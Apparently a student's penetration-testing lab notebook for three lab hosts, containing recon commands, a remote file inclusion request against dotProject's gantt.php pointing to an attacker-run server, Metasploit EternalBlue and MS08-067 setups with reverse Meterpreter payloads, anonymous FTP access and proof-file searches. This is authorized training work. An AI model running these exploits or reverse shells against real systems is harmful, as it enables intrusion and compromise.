# Work (scratch)

Session transcripts, command snippets, loot exports, and rough notes. Keep **passwords and live tokens out of git**—paste redacted copies here if you need a paper trail.

---

# Plan of attack (A_Rocha IPs)

**Scope:** Lab-authorized targets only — `10.20.160.102`, `10.20.160.101`, `10.20.160.100`.  
**Operator VM:** **KALI6** (see [parent README](../README.md)).  
**Placeholders:** Replace `<KALI_IP>` / `<KALI_LAB_IP>` with your Kali address on the **lab network** (e.g. `ip -br a`), `<RHOST>` with the target below.

Summaries below match the Nessus notes in [../README.md](../README.md#nessus--my-hosts-specs--findings); adjust ports and paths after your own `nmap` / service scan.

---

## `10.20.160.102` — Linux / dotProject 2.1.6 (validated)

| Field | Value |
|-------|--------|
| **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
| **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
| **Confirmed primitive** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — response body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004` evidence](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)) |
| **OWASP ZAP (baseline)** | **Active scan:** **Parameter Tampering** on **`login`** at **`/dotproject/index.php`** (Medium — error-style output / **CWE-472**). **Passive + active:** **X-Frame-Options** missing (clickjacking), weak **cookie** flags, no **Anti-CSRF** on forms, **`X-Powered-By`** leak, **`X-Content-Type-Options`** missing, **timestamp** disclosures — see [`102-005`](../Screenshots/102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png), [`102-006`](../Screenshots/102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png). |

**Lanes that did not pan out:** Shellshock (**MSF `check`** negative), **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** rows, RFI **listener / path** mistakes — full notes and screenshots: **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)**.

**Plan shift after ZAP:** keep **RFI** as the proven lane; add **time-boxed** manual follow-up on **`login`** (**SQLi** / **auth bypass** / **logic flaws**) using ZAP evidence as the map; treat **clickjacking** / **cookie** / **CSRF** items as **defense-in-depth** findings for the report unless the rubric rewards chained client-side impact.

### Plan of attack — commands (current)

```bash
export RHOST_102=10.20.160.102
echo TM6_afrocha; date
ip -br a    # set LHOST / KALI_LAB_IP to the interface .102 can reach (e.g. 10.20.150.106)
```

**1 — Map services**

```bash
nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial
nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"
```

**2 — Web entry + version fingerprint**

```bash
curl -sik "http://$RHOST_102/"
curl -sik "http://$RHOST_102/dotproject/"
curl -sik "http://$RHOST_102/dotproject/index.php"
```

**3 — Optional web scanners**

```bash
nikto -h "http://$RHOST_102"
```

**OWASP ZAP** (scope **`http://$RHOST_102/dotproject/`** — Quick Start / spider, then **active scan**; proxy listen e.g. **`localhost:8081`** if you avoid colliding with **`8080`** RFI PoC):

- Review **Alerts** — prioritize **Medium** **Parameter Tampering** on **`login`** (manual: **SQLi**, type juggling, auth bypass) before burning time on **Low** header-only rows.
- **X-Frame-Options** / **CSRF** / **cookie flags** — document for **remediation**; exploit only if course **ROE** rewards **session** impact and you have a **clear chain**.

**4 — Exploit-DB + RFI proof (lab-authorized)**

```bash
searchsploit dotproject 2.1.6
searchsploit -x php/webapps/<id-for-gantt-RFI>

export LHOST=<KALI_LAB_IP>
mkdir -p ~/rfi_poc
printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
printf 'PROOF\n' > ~/rfi_poc/proof.txt
cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
```

New terminal:

```bash
export RHOST_102=10.20.160.102
export LHOST=<KALI_LAB_IP>

curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
curl -s "http://$LHOST:8080/proof.txt"
curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
```

Use **`http://`** to your listener (**not** `https://`). Keep all served files under **`~/rfi_poc/`** (same directory as **`http.server`**).

**5 — Post-ex (after shell or per rubric)**

```bash
hostname; whoami; id
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

### Evidence index (`../Screenshots/`)

| Topic | Files |
|-------|--------|
| nmap / http-enum | `recon_nmap_102_initial_tm6_afrocha.png`, `recon_nmap_102_http_enum_headers_tm6_afrocha.png` |
| curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
| Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
| Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png` |
| Chronological **102-*** | `102-001_curl_gantt_si_200_tm6_afrocha.png` … `102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` (`102-002`, `102-003`); **`102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png`**, **`102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png`** (ZAP) |
| OWASP ZAP | `102-005_zap_parameter_tampering_login_dotproject_tm6_afrocha.png` (Parameter Tampering **`login`**), `102-006_zap_x_frame_options_missing_dotproject_tm6_afrocha.png` (headers / alert summary) |
| Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
| MSF Shellshock `check` | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` |
| searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |

Screenshot naming **`102-NNN_…`**: [parent README](../README.md) + [`.cursor` rule](../../.cursor/rules/ept-evidence-screenshots.mdc).

---

## `10.20.160.101` — Windows 7 Ultimate (validated recon)

| Field | Value |
|-------|--------|
| **NetBIOS name** | **CALLISTO** |
| **Workgroup** | **JUPITER** |
| **MAC** (from enum) | `00:50:56:86:4F:A2` |
| **OS** | **Windows 7 Ultimate 7601 SP1 x64** (from **CrackMapExec**) |
| **SMB signing** | **False** · **SMBv1: True** (CME) |
| **FTP anonymous** | **Allowed** — **`anonymous`** / **`test@`** (email-form password) → **`230 Logged on`** — FileZilla **0.9.37 beta** ([`101-011`](../Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png)) |

**Open services (from `nmap --top-ports 1000`):** **21** (FileZilla **ftpd**), **80** (**Apache 2.2.17 Win32**, **PHP 5.3.4**, mod_ssl, mod_perl), **135/139/445** (MS-RPC / SMB), **443** (HTTPS), **3306** (MySQL?), **3389** (RDP), **49152–49155** (RPC). **HTTP** is an additional attack surface vs SMB-only assumptions.

**Null / anonymous SMB enum (this run):** **`smbclient -L -N`** reported anonymous login but **“SMB1 disabled — no workgroup available”** (no share list). **CrackMapExec** **`--shares -u '' -p ''`** → **`STATUS_ACCESS_DENIED`**. **`enum4linux -a`** retrieved **workgroup** and **nbtstat**, then **`NT_STATUS_ACCESS_DENIED`** on SID/OS/users/shares/groups/RID/printers — see **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)** (section **`.101` — null SMB**). **Pivot:** **anonymous FTP** works (see table above); **MS17-010** dead end documented in [`unfruitful_attempts`](unfruitful_attempts/README.md); continue **HTTP** / **FTP listing & upload** (if permitted) per rubric.

### Plan of attack — commands (current)

```bash
export RHOST=10.20.160.101
echo TM6_afrocha; date

nmap -Pn -sV --top-ports 1000 "$RHOST" -oA ~/scans/nmap_101_top1000
nmap -Pn -sV -p 135,139,445,21,80,443,3306,3389,49152-49155 -sC "$RHOST" -oA ~/scans/nmap_101_services

smbclient -L "//${RHOST}" -N
crackmapexec smb "$RHOST" --shares -u '' -p ''
enum4linux -a "$RHOST"
```

**After you have a reason to test SMB vulns (lab allows):**

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
```

```text
# EternalBlue targets SMB — RPORT must be 445, RHOSTS must be 10.20.160.101 (not 10.20.150.x)
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.20.160.101
set RPORT 445
set LHOST <KALI_LAB_IP>
set LPORT 4444
check
run
```

If **`check`** reports **Host does NOT appear vulnerable** / **`STATUS_INVALID_HANDLE`** — the image is likely **MS17-010 patched** or the scanner cannot confirm exploitability. **`set ForceExploit true`** only **bypasses the abort**; if grooming finishes and there is still **no session**, treat **EternalBlue as dead** for this host — see [`101-008`](../Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png), [`101-009`](../Screenshots/101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png), [`101-010`](../Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png). **Pivot:** **HTTP** (**80** Apache/PHP), **FTP**, **RDP**, **MySQL**, or **credentialed** SMB — [`unfruitful_attempts`](unfruitful_attempts/README.md).

**HTTP on 80/443 (parallel lane):**

```bash
curl -sik "http://$RHOST/"
nikto -h "http://$RHOST"
```

**FTP — anonymous (validated):**

```bash
nmap -Pn -p21 -sV -sC "$RHOST"
ftp "$RHOST"
# Name: anonymous
# Password: test@   # any email-shaped string is typical for anonymous FTP
# → 230 Logged on — then: ls, cd xampp, get/put per lab rules
```

**RDP when ready:**

```bash
nmap -Pn -p3389 -sV -sC "$RHOST"
# xfreerdp /v:$RHOST /u:<user> /p:<pass> /cert:ignore
```

### Evidence (`101-NNN_*` — chronological for this host)

| # | File | What it shows |
|---|------|----------------|
| **101-001** | [`101-001_nmap_smbclient_cme_tm6_afrocha.png`](../Screenshots/101-001_nmap_smbclient_cme_tm6_afrocha.png) | `nmap --top-ports 1000`, **`smbclient -L -N`**, **CrackMapExec** null shares |
| **101-002** | [`101-002_enum4linux_workgroup_netbios_tm6_afrocha.png`](../Screenshots/101-002_enum4linux_workgroup_netbios_tm6_afrocha.png) | **enum4linux** — **JUPITER**, **CALLISTO**, nbtstat |
| **101-003** | [`101-003_enum4linux_access_denied_tm6_afrocha.png`](../Screenshots/101-003_enum4linux_access_denied_tm6_afrocha.png) | SID/OS/users/shares → **`ACCESS_DENIED`** |
| **101-004** | [`101-004_enum4linux_polenum_null_fail_tm6_afrocha.png`](../Screenshots/101-004_enum4linux_polenum_null_fail_tm6_afrocha.png) | Password policy / **NULL** session attach fail |
| **101-005** | [`101-005_enum4linux_groups_rid_fail_tm6_afrocha.png`](../Screenshots/101-005_enum4linux_groups_rid_fail_tm6_afrocha.png) | Groups / RID / printers → **denied** |
| **101-006** | [`101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png`](../Screenshots/101-006_msf_eternalblue_wrong_rhost_rport_tm6_afrocha.png) | MSF EternalBlue — **wrong IP octet** + **`RPORT 80`** (use **`.160.101`** + **`445`**) — see [`unfruitful_attempts`](unfruitful_attempts/README.md) |
| **101-007** | [`101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png`](../Screenshots/101-007_msf_eternalblue_rport80_ipc_error_tm6_afrocha.png) | Same issue: **`RPORT 80`** → SMB **`IPC$`** error + **`not-vulnerable`** — **`set RPORT 445`** |
| **101-008** | [`101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png`](../Screenshots/101-008_msf_eternalblue_check_not_vulnerable_tm6_afrocha.png) | **`RPORT 445`** OK — **`check`** still **not vulnerable** / **`run`** aborts — treat host as **patched**; pivot off SMB exploit |
| **101-009** | [`101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png`](../Screenshots/101-009_msf_eternalblue_forceexploit_check_win7_groom_tm6_afrocha.png) | **`ForceExploit true`** — **`check`** still negative; target IDs as **Win7 Ultimate 7601 SP1**; exploit starts **groom / eb_trans2** — not a fix for “not vulnerable” |
| **101-010** | [`101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png`](../Screenshots/101-010_msf_eternalblue_forceexploit_trans2_no_session_tm6_afrocha.png) | **Pool grooming** + **Trans2 exploit packet** completes → **no Meterpreter session** — confirms **ForceExploit** did not achieve code exec (patched / hardened) |
| **101-011** | [`101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png`](../Screenshots/101-011_ftp_anonymous_230_logged_on_tm6_afrocha.png) | **`ftp 10.20.160.101`** — **`anonymous`** / **`test@`** → **`230 Logged on`** — FileZilla **0.9.37 beta** (FTP access, not a shell) |

---

## `10.20.160.100` — Windows XP (EOL)

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **OS** | Windows XP SP2/SP3 / embedded variant |
| **Open ports (from host table)** | **139, 445** (SMB), RDP likely given Nessus |
| **Nessus highlights** | **Unsupported XP** (critical), **SMB** issues, **RDP** MiTM class, many **info** SMB/plugin rows |

### Vulnerabilities (brief)

- **EOL OS** — huge unpatched surface; **SMBv1** era bugs (MS08-067, MS17-010) *may* apply depending on service pack and lab image.
- **RDP** — weak creds or known lab passwords.
- **SMB** — null session, share enumeration, pipe abuse per lab tooling.

### Plan of attack (commands)

**1 — Fast SMB + vuln scripts.**

```bash
export RHOST=10.20.160.100

nmap -Pn -sV -p139,445,3389 -sC "$RHOST" -oA ~/scans/nmap_100
nmap -Pn -p445 --script smb-os-discovery,smb-vuln-ms17-010,smb-vuln-ms08-067 "$RHOST"
```

**2 — Enum4linux / smbclient.**

```bash
enum4linux -a "$RHOST"
smbclient -L "//${RHOST}" -N
rpcclient -U "" -N "$RHOST"
```

**3 — Metasploit lanes (pick what matches scan; do not blindly exploit).**

```text
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.20.160.100
run

use exploit/windows/smb/ms08_067_netapi
# OR (if SP/build matches MS17-010 positive check):
# use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.20.160.100
set LHOST <KALI_IP>
set payload windows/meterpreter/reverse_tcp
check
```

**4 — Proof files (same pattern as other hosts).**

```text
meterpreter > getuid
meterpreter > shell
C:\> hostname && whoami
C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
```

---

## Ordering suggestion (one operator on KALI6)

1. **.102** — **dotProject RFI / web** first (validated path); **ZAP** flags **`login`** parameter tampering → time-box **SQLi / auth** follow-up; Shellshock and generic MSF noise archived under [`unfruitful_attempts/`](unfruitful_attempts/README.md).  
2. **.100** — **XP/SMB** classics; do while you have Metasploit workspace warm.  
3. **.101** — **Win7** harder target; use creds or results from **.100** lateral moves if the scenario allows.

Document **what you ran**, **what failed** ([`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)), and **screenshots** under [`../Screenshots/`](../Screenshots/) before promoting to team [`../../1_Screenshots/`](../../1_Screenshots/).
